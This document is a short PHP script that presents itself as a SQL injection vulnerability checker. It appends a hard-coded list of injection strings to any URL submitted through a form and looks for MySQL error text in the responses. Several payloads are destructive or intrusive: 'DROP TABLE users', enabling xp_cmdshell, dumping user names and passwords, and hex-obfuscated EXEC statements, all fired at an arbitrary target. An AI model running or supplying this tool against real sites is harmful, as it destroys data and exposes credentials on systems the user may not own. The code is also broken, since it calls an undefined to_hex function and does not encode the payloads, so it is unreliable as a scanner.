<?php

if (isset($_POST['target_url'])) {
    $target_url = $_POST['target_url'];
    $test_strings = array(
      "'",
      " OR 1=1--",
      " OR 1=1#",
      " OR '1'='1",
      " OR '1'='1'--",
      " OR '1'='1'#",
      " OR 'a'='a",
      " OR 'a'='a'--",
      " OR 'a'='a'#",
      "; SELECT SLEEP(5)--",
      "'; SELECT SLEEP(5);--",
      "'; SELECT SLEEP(5);#",
      "'; EXEC master..xp_cmdshell 'ping 127.0.0.1';--",
      "; DECLARE @q VARCHAR(1024);SET @q=CHAR(0x" . implode(array_map("to_hex", str_split("SELECT @@version"))) . ");EXEC(@q);--",
      "' UNION SELECT 1, 2, 3--",
      "' UNION ALL SELECT name, password, '' FROM users--",
      "' UNION ALL SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema = 'database_name'--",
      "'; DROP TABLE table_name;--",
      "'; WAITFOR DELAY '0:0:5';--",
      "'; EXEC sp_configure 'show advanced options', 1; reconfigure; EXEC sp_configure 'xp_cmdshell', 1; reconfigure;--",
      "' OR (SELECT ASCII(SUBSTRING((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'database_name'), 1, 1)) > 48)--",
      "' OR (SELECT ASCII(SUBSTRING((SELECT user), 1, 1)) > 80)--",
      "' OR (SELECT ASCII(SUBSTRING((SELECT version()), 1, 1)) > 80)--",
      "' OR (SELECT ASCII(SUBSTRING((SELECT database()), 1, 1)) > 80)--",
      "' OR (SELECT ASCII(SUBSTRING((SELECT @@hostname), 1, 1)) > 80)--",
      "'; WAITFOR DELAY '0:0:5';--",
      "'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'';';--",
      "' OR (SELECT TOP 1 name FROM sys.databases);--",
      "'; DECLARE @T varchar(100) SET @T=CHAR(0x" . implode(array_map("to_hex", str_split("SELECT @@version"))) . ");EXEC(@T);--",
      "'; EXEC sp_executesql N'DECLARE @T varchar(100) SET @T=CHAR(0x" . implode(array_map("to_hex", str_split("SELECT @@version"))) . ");EXEC(@T);';--",
      "'; DECLARE @T varchar(100) SET @T=CHAR(0x" . implode(array_map("to_hex", str_split("SELECT name FROM sys.tables"))) . ");EXEC(@T);--",
      "'; EXEC sp_executesql N'DECLARE @T varchar(100) SET @T=CHAR(0x" . implode(array_map("to_hex", str_split("SELECT name FROM sys.tables"))) . ");EXEC(@T);';--",
      "'; DECLARE @T varchar(100) SET @T=CHAR(0x" . implode(array_map("to_hex", str_split("SELECT name, password FROM users"))) . ");EXEC(@T);--",
      "'; EXEC sp_executesql N'DECLARE @T varchar(100) SET @T=CHAR(0x" . implode(array_map("to_hex", str_split("SELECT name, password FROM users"))) . ");EXEC(@T);';--",
      "'; DECLARE @T varchar(100) SET @T=CHAR(0x" . implode(array_map("to_hex", str_split("DROP TABLE users"))) . ");EXEC(@T);--",
      "'; EXEC sp_executesql N'DECLARE @T varchar(100) SET @T=CHAR(0x" . implode(array_map("to_hex", str_split("DROP TABLE users"))) . ");EXEC(@T);';--"
    );
    

    $vulnerable = false;

    foreach ($test_strings as $test_string) {
        $url = $target_url . $test_string;
        $response = @file_get_contents($url);

        if ($response === false) {
            // Error occurred, could not fetch content from URL
            echo "<p class='notification is-danger'>Error: Failed to retrieve content from URL</p>";
            break;
        } else {
            // Check if response contains any signs of SQL injection vulnerability
            if (strpos($response, "syntax error") !== false || strpos($response, "mysql_fetch_assoc") !== false || strpos($response, "mysql_num_rows") !== false) {
                $vulnerable = true;
                break;
            }
        }
    }

    if ($vulnerable) {
        echo "<p class='notification is-danger'>Vulnerable to SQL injection</p>";
    } else {
        echo "<p class='notification is-success'>Not vulnerable to SQL injection</p>";
    }
}

?>
